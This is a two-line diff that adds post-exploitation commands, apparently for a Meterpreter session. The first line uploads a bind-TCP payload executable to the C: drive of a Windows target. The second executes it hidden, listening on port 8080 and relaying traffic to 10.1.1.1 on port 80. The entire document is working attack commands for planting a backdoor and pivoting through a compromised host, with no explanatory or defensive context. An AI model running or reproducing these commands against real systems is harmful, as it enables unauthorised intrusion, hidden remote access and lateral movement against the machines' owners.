@@ -1,0 +1,2 @@
+upload payloads/naishobindtcp.exe c:\\
+execute -f "c:\\naishobindtcp.exe 8080 10.1.1.1 80" -i -H
